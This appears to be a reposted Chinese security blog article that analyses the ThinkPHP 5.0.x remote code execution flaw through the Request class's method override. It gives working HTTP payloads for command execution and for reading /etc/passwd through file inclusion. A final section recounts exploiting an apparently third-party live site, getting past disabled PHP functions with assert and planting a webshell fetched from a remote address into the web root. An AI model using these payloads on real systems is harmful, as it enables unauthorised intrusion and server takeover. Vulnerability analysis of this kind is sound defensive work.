> 原文链接: https://www.anquanke.com//post/id/222672 


# ThinkPHP5.0.x RCE分析与利用


                                阅读量   
                                **191812**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01a996657b114f626d.jpg)](https://p5.ssl.qhimg.com/t01a996657b114f626d.jpg)



## ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"></a>漏洞原理分析

为了分析`5.0.23`之前所存在的安全问题，不妨在Github上查看`5.0.23`和`5.0.24`发行的**Change.log**

[![](https://p5.ssl.qhimg.com/t0177a4174c6c675949.png)](https://p5.ssl.qhimg.com/t0177a4174c6c675949.png)

可以看到Request类中对method方法进行了改进，而Request类是ThinkPHP中处理请求的文件，因此使用Beyond Compare对5.0.23和5.0.24进行比较发现：

[![](https://p2.ssl.qhimg.com/t015b6548eaf065918f.png)](https://p2.ssl.qhimg.com/t015b6548eaf065918f.png)

可以看到，在`5.0.24`中对`$this-&gt;method`新增了白名单过滤，只允许`$this-&gt;method`为常用的几个方法，否则就将其置为`POST`方法，因此我们的入口点就可以从`Request.php`跟进。

全局搜索`call_user_func`，在`Request.php`中发现在`filterValue`方法中

`/thinkphp/library/think/Request.php`

```
private function filterValue(&amp;$value, $key, $filters)
    `{`
        $default = array_pop($filters);
        foreach ($filters as $filter) `{`
            if (is_callable($filter)) `{`
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            `}` elseif (is_scalar($value)) `{`
                if (false !== strpos($filter, '/')) `{`
                    // 正则过滤
                    if (!preg_match($filter, $value)) `{`
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    `}`
                `}`
```

将该方法的第三个参数(array)取出键值作为`call_user_func`的方法，并且将第一个参数`$value`作为回调函数的参数传入，最后将回调函数的返回重新赋值给`$value` 现在全局搜索，哪些方法调用了该`filterValue`方法

`/thinkphp/library/think/Request.php`中存在`input`方法，其中调用`filterValue`方法

```
public function input($data = [], $name = '', $default = null, $filter = '')
    `{`
        if (false === $name) `{`
            // 获取原始数据
            return $data;
        `}`
        $name = (string) $name;
        if ('' != $name) `{`

            // 解析name
            if (strpos($name, '/')) `{`
                list($name, $type) = explode('/', $name);
            `}` else `{`
                $type = 's';
            `}`
            // 按.拆分成多维数组进行判断
            foreach (explode('.', $name) as $val) `{`
                if (isset($data[$val])) `{`
                    $data = $data[$val];
                `}` else `{`
                    // 无输入数据，返回默认值
                    return $default;
                `}`
            `}`
            if (is_object($data)) `{`
                return $data;
            `}`
        `}`

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        if (is_array($data)) `{`
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            reset($data);
        `}` else `{`
            $this-&gt;filterValue($data, $name, $filter);
        `}`

        if (isset($type) &amp;&amp; $data !== $default) `{`
            // 强制类型转换
            $this-&gt;typeCast($data, $type);
        `}`
        return $data;
    `}`
```

发现无论`$data`是不是数组最终都会调用`filterValue`方法，而`$filter`则会进行过滤器解析，跟进`$this-&gt;getFilter`方法查看解析过程:

```
protected function getFilter($filter, $default)
    `{`
        if (is_null($filter)) `{`
            $filter = [];
        `}` else `{`
            $filter = $filter ?: $this-&gt;filter;
            if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) `{`
                $filter = explode(',', $filter);
            `}` else `{`
                $filter = (array) $filter;
            `}`
        `}`

        $filter[] = $default;
        return $filter;
    `}`
```

可以看到如果`$filter`不存在时，将`$filter`赋值为`$this-&gt;filter`,最后将`$filter[]`赋值为`null`，注意此时并不是将`$filter[]`数组全部清空，只是使得`$filter[n+1]=null`，即在数组的最后一个键名新增一个连续的键名，键值为null

[![](https://p0.ssl.qhimg.com/t01486a188876e716ec.png)](https://p0.ssl.qhimg.com/t01486a188876e716ec.png)

回到`input`方法中，`array_walk_recursive`函数会对第一个数组参数中的每个元素应用第二个参数的函数。在`input`类方法中，`$data`中键名作为`filterValue(&amp;$value, $key, $filters)`中的value,键值作为key,filter作为第三个参数$filters,而当这些传入到`filterValue`后，`call_user_func`又是利用`filter`作为回调的函数，`value`作为回调函数的参数，因此也就是`input`方法中的`data`是回调函数的参数，`filter`是需要回调的函数。

了解之后我们需要查找`input`方法在何处被调用，全局搜索一下：

同文件`param`方法最后调用该方法并作为返回：

```
public function param($name = '', $default = null, $filter = '')
    `{`
        if (empty($this-&gt;mergeParam)) `{`
            $method = $this-&gt;method(true);
            // 自动获取请求变量
            switch ($method) `{`
                case 'POST':
                    $vars = $this-&gt;post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this-&gt;put(false);
                    break;
                default:
                    $vars = [];
            `}`
            // 当前请求参数和URL地址中的参数合并
            $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
            $this-&gt;mergeParam = true;
        `}`
        if (true === $name) `{`
            // 获取包含文件上传信息的数组
            $file = $this-&gt;file();
            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;
            return $this-&gt;input($data, '', $default, $filter);
        `}`
        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
    `}`
```

`$this-&gt;param`为当前请求参数和URL地址中的参数合并，是可控值，也就是把请求参数和路由参数以及当前方法参数进行合并，此时我们有了回调函数的参数，还缺少`$filter`，因此我们还要设法控制`Request`类的`$this-&gt;filter`

分析到这里，我们在文章开头所说的对于`Request`的改进却并没有用上，此时不妨移步到`method()`方法，前文说到在更新版本后对`method`增加了白名单，我们不妨看看此方法。

```
public function method($method = false)
    `{`
        if (true === $method) `{`
            // 获取原始请求类型
            return $this-&gt;server('REQUEST_METHOD') ?: 'GET';
        `}` elseif (!$this-&gt;method) `{`
            if (isset($_POST[Config::get('var_method')])) `{`
                $this-&gt;method = strtoupper($_POST[Config::get('var_method')]);
                $this-&gt;`{`$this-&gt;method`}`($_POST);
            `}` elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) `{`
                $this-&gt;method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
            `}` else `{`
                $this-&gt;method = $this-&gt;server('REQUEST_METHOD') ?: 'GET';
            `}`
        `}`
        return $this-&gt;method;
    `}`
```

可以看到，当`$method`是`false`时，`$this-&gt;method = strtoupper($_POST[Config::get('var_method')])`，这是否是我们可控的参数，回到TP的系统配置文件上，

[![](https://p4.ssl.qhimg.com/t01b5870f495188178b.png)](https://p4.ssl.qhimg.com/t01b5870f495188178b.png)

可以知道，`Config::get('var_method')=='_method'`，意味着POST上传`_method`的值，是可以在`Request`类中进行的方法，即可以任意调用该类中存在的任何方法。

此时`__construct()`这个神奇的构造方法起到了奇效。

```
protected function __construct($options = [])
    `{`
        foreach ($options as $name =&gt; $item) `{`
            if (property_exists($this, $name)) `{`
                $this-&gt;$name = $item;
            `}`
        `}`
        if (is_null($this-&gt;filter)) `{`
            $this-&gt;filter = Config::get('default_filter');
        `}`
        // 保存 php://input
        $this-&gt;input = file_get_contents('php://input');
    `}`
```

此处存在任意属性赋值，意味着可以将`Reqeust`类中的属性的值通过POST来任意改变，前文不是需要控制回调方法的回调函数，即`$this-&gt;filter`吗？在这里就可以通过构造函数直接赋值，即`_method=__construct&amp;filter[]=system`，有了这些之后，我们只需要回调函数的参数，回到上述分析的`param`方法中，

```
$this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
```

作为`$data`传入`input`方法，跟进`$this-&gt;get`

```
public function get($name = '', $default = null, $filter = '')
    `{`
        if (empty($this-&gt;get)) `{`
            $this-&gt;get = $_GET;
        `}`
        if (is_array($name)) `{`
            $this-&gt;param      = [];
            $this-&gt;mergeParam = false;
            return $this-&gt;get = array_merge($this-&gt;get, $name);
        `}`
        return $this-&gt;input($this-&gt;get, $name, $default, $filter);
    `}`
```

如果`$this-&gt;get`为空，直接将其赋值为`$_GET`,而最后将`$this-&gt;get`作为`input`方法的第一个参数，因此我们可以听过变量覆盖，直接将`$this-&gt;get`赋值，就此我们控制了回调函数和参数。

即`_method=__construct&amp;filter[]=system&amp;get[]=whoami`或者`_method=__construct&amp;filter[]=system&amp;route[]=whoami`

上面只是漏洞产生原理的分析，我们还需要了解怎么调用的`Request`类的`method`方法以及`param`方法，全局搜索一下发现

`thinkphp/library/think/Route.php`

[![](https://p5.ssl.qhimg.com/t01ab6a755e6d8fbf1f.png)](https://p5.ssl.qhimg.com/t01ab6a755e6d8fbf1f.png)

`$request-&gt;method()`没有任何参数，选取默认参数为`false`，符合上述的逻辑链，因此在全局搜索`$check`的上层利用链

`thinkphp/library/think/APP.app`中

[![](https://p3.ssl.qhimg.com/t01fb7e23b776dc7a14.png)](https://p3.ssl.qhimg.com/t01fb7e23b776dc7a14.png)

该语句包含在`if($check)`条件下，只有`$check==true`时，才会进入执行该语句，可以看到路由检测中，如果`self::$routeCheck`为空，则会将`$condig['url_route_on']`赋值给`$check`，而在配置文件中该值默认为==true==。

当我们跟随入口文件`index.php`时会发现，一定会调用`APP:run()`,该类为应用程序启动类，调用该方法执行应用，跟进

[![](https://p5.ssl.qhimg.com/t017d5e4d27587481bc.png)](https://p5.ssl.qhimg.com/t017d5e4d27587481bc.png)

当`$dispatch`为空时，调用`routeCheck`方法，跟进`Hook::listen('app_dispatch',self::$dispatch)`发现：

[![](https://p0.ssl.qhimg.com/t01daf4e354bdfd55ed.png)](https://p0.ssl.qhimg.com/t01daf4e354bdfd55ed.png)

没有涉及`$dispatch`，因此`self::$dispatch`为空，这样最终能够能够调用`$request-&gt;method()`方法，接下来是`Request`对象`param`方法的触发流程:

全局搜索`param`方法发现该如下几处调用了`Reqeust::method()`

`APP::run()`

```
// 记录路由和请求信息
            if (self::$debug) `{`
                Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
                Log::record('[ HEADER ] ' . var_export($request-&gt;header(), true), 'info');
                Log::record('[ PARAM ] ' . var_export($request-&gt;param(), true), 'info');
            `}`
```

可知如果开了调试模式的话，在启动执行应用程序时会自动调用`$request-&gt;param()`方法。因此当开启调式模式时，我们的分析利用链到此时已经结束，可以构造相应`payload`

```
POST:_method=__construct&amp;filter[]=system&amp;get[]=whoami  or _method=__construct&amp;filter[]=system&amp;route[]=whoami
```

[![](https://p2.ssl.qhimg.com/t01e1b3b5dd61a75648.png)](https://p2.ssl.qhimg.com/t01e1b3b5dd61a75648.png)

如果关闭了调试状态（通常情况下也会关闭调试状态），则需要搜索其他利用链

`APP::exec()`

```
protected static function exec($dispatch, $config)
    `{`
        switch ($dispatch['type']) `{`
            case 'redirect': // 重定向跳转
                $data = Response::create($dispatch['url'], 'redirect')
                    -&gt;code($dispatch['status']);
                break;
            case 'module': // 模块/控制器/操作
                $data = self::module(
                    $dispatch['module'],
                    $config,
                    isset($dispatch['convert']) ? $dispatch['convert'] : null
                );
                break;
            case 'controller': // 执行控制器操作
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']);
                $data = Loader::action(
                    $dispatch['controller'],
                    $vars,
                    $config['url_controller_layer'],
                    $config['controller_suffix']
                );
                break;
            case 'method': // 回调方法
                $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']);
                $data = self::invokeMethod($dispatch['method'], $vars);
                break;
            case 'function': // 闭包
                $data = self::invokeFunction($dispatch['function']);
                break;
            case 'response': // Response 实例
                $data = $dispatch['response'];
                break;
            default:
                throw new \InvalidArgumentException('dispatch type not support');
        `}`

        return $data;
    `}`
```

当`$dispatch['type']==method或者$dispatch['type']==controller`时，会调用`param()`方法，而在`APP::run`中调用了**exec**方法，所以我们只需要控制调度信息`$dispatch`的值

`APP:run()`中跟进`routeCheck()`方法：

[![](https://p2.ssl.qhimg.com/t019a286a2d8d6d28ef.png)](https://p2.ssl.qhimg.com/t019a286a2d8d6d28ef.png)

路由有效时跟进`Route::check()`方法：

[![](https://p0.ssl.qhimg.com/t01eb8cd7184d29e96c.png)](https://p0.ssl.qhimg.com/t01eb8cd7184d29e96c.png)

当我们需要**$dispatch[‘type’]** 等于 **controller** 或者 **method**时，最终跟进到`Route::parseRule`方法

[![](https://p1.ssl.qhimg.com/t01a60671ec5cf9d9c8.png)](https://p1.ssl.qhimg.com/t01a60671ec5cf9d9c8.png)

当路由执行为**路由到方法**或者**路由到控制器**时都能使得`$result['type']`满足，即最后**$dispatch[‘type’]** 等于 **controller** 或者 **method**而调用`param`方法。

ThinkPHP路由地址表示定义的路由表达式最终需要路由到的地址以及一些需要的额外参数，支持下面5种方式定义：

|定义方式|定义格式
|------
|方式1：路由到模块/控制器|‘[模块/控制器/操作]?额外参数1=值1&amp;额外参数2=值2…’
|方式2：路由到重定向地址|‘外部地址’（默认301重定向） 或者 [‘外部地址’,’重定向代码’]
|方式3：路由到控制器的方法|‘@[模块/控制器/]操作’
|方式4：路由到类的方法|‘\完整的命名空间类::静态方法’ 或者 ‘\完整的命名空间类@动态方法’
|方式5：路由到闭包函数|闭包函数定义（支持参数传入）

而路由到控制器还是到方法等是取决于`$route`，因此还需分析`$route`取值，在`checkRoute`的构造方法中：

[![](https://p1.ssl.qhimg.com/t0154c9b3e6161a6fd6.png)](https://p1.ssl.qhimg.com/t0154c9b3e6161a6fd6.png)

因此分析`checkRoute`的上层利用链，在`Route::check()`方法中发现：

[![](https://p4.ssl.qhimg.com/t01a7e7bedb8088a79d.png)](https://p4.ssl.qhimg.com/t01a7e7bedb8088a79d.png)

该`$method`可以通过变量覆盖将其改变，因此需要寻找注册`$method`值的路由，ThinkPHP5 中自带的验证码组件captcha注册了一个`get`路由规则，路由到类的方法，满足case条件。这里可以知道`method=get`是为了正确获取captcha的路由规则。

[![](https://p2.ssl.qhimg.com/t011bcccb6a8326852e.png)](https://p2.ssl.qhimg.com/t011bcccb6a8326852e.png)

因此可以构造相应**payload**

```
POST /index.php?s=captcha&amp;_method=__construct&amp;method=get&amp;filter[]=system&amp;get[]=ipconfig
```

[![](https://p4.ssl.qhimg.com/t01f4407062843d9f27.png)](https://p4.ssl.qhimg.com/t01f4407062843d9f27.png)



## 任意文件包含

根据以上分析，在该版本`ThinkPHP`中还存在任意文件包含，在`thinkphp\library\think\Loader.php`中存在`__include_file`方法：

```
namespace think;
...
function __include_file($file)
`{`
    return include $file;
`}`
```

可以通过回调函数`call_user_func`调用`think\__include_file`，可以构造相应payload

```
POST /index.php?s=captcha 
_method=__construct&amp;method=GET&amp;filter[]=think\__include_file&amp;server[REQUEST_METHOD]==/etc/passwd
```

注意调用该方法时会进入`Request.php`中的`param`方法：

[![](https://p1.ssl.qhimg.com/t017700274e3ceaa331.png)](https://p1.ssl.qhimg.com/t017700274e3ceaa331.png)

​ `method`方法本来是`false`默认参数，现在参数为`true`，我们跟进看一下其逻辑:

[![](https://p5.ssl.qhimg.com/t01c982ed5fd8a20ca1.png)](https://p5.ssl.qhimg.com/t01c982ed5fd8a20ca1.png)

直接进入第一个`if`语句中，调用关键方法`server()`，在不妨跟进:

```
public function server($name = '', $default = null, $filter = '')
    `{`
        if (empty($this-&gt;server)) `{`
            $this-&gt;server = $_SERVER;
        `}`
        if (is_array($name)) `{`
            return $this-&gt;server = array_merge($this-&gt;server, $name);
        `}`
        return $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);
    `}`
```

上文已分析过，`$this-&gt;input()`第一个参数，即使回调函数的参数，因此`$this-&gt;server`将是我们想要执行方法的参数，此处我们执行的`think\__include_file`方法，因此我们要改变`$this-&gt;server`的值，由于`$server`为`Request`类的属性，根据上文变量覆盖利用，我们利用变量覆盖使得`$_SERVER[REQUEST_METHOD]`为参数，这样就能利用`include`进行任意文件包含。



## 实际利用

发现某站部署`Thinkphp v5`系统，并且在系统配置中是默认配置的`debug`模式：

[![](https://p3.ssl.qhimg.com/t0186366ff9c4a188f9.png)](https://p3.ssl.qhimg.com/t0186366ff9c4a188f9.png)

在`debug`状态下，我们知道网站的绝对路径，并且`ThinkPHP`版本号为`V5.0.x`，由于开启`debug`状态，构造相应`payload`进行探测

```
POST:_method=__construct&amp;filter[]=system&amp;get[]=whoami
```

发现**php**配置文件中应该设置了`disabled_function`:

[![](https://p3.ssl.qhimg.com/t0179e813174ae0d331.png)](https://p3.ssl.qhimg.com/t0179e813174ae0d331.png)

我们知道在`phpinfo()`中即使加入参数，也不影响其执行，因此`call_user_func('phpinfo()','1')`同样能够执行

先看一波`phpinfo`看看禁用哪些函数,发现还设置了`open_basedir`

[![](https://p4.ssl.qhimg.com/t014bd40af5ba86909b.png)](https://p4.ssl.qhimg.com/t014bd40af5ba86909b.png)

[![](https://p5.ssl.qhimg.com/t013b28104a9ada2b13.png)](https://p5.ssl.qhimg.com/t013b28104a9ada2b13.png)

```
passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
```

把最为常用的函数禁用了，当该PHP版本低于**7.2**,因此`assert`这个关键的函数并没有过滤，也就意味着我们能先使用`assert`来做一些操作，本来是直接构造

```
POST:_method=__construct&amp;filter[]=assert&amp;get[]=assert($_POST[1]);
```

然后用`antsword`连上就好，但是发现并不能成功连接，原因可能是`antsword`和菜刀仅支持`eval`后门，可能现在就需要换一换思路:

在默认配置中，`file_get_contents`可以读取**URL**内容并进行输出，并且`file_get_contents`是不会被ban的，这里先验证一下:

```
POST:_method=__construct&amp;filter[]=assert&amp;get[]=assert($_POST[1]);&amp;1=print(file_get_contents("./index.php"));
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014e1f295ddc2492dd.png)

因此直接结合网站绝对路径，我们知道在`public`是面向用户的，我们可以利用`file_get_contents`读取马后使用`file_put_contents`写入到`public`目录下，这样就能够一句话进行连接

```
_method=__construct&amp;filter[]=assert&amp;get[]=$a=(file_get_contents("http://马的地址"));$b=file_put_contents('网站根目录/public/xxx.php',$a);
```

最终`getshell`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01451e31e44b7837ad.png)

可见如果目前还在使用`Thinkphp5.0`版本是十分危险的，应该及时更新版本或者相应打上补丁
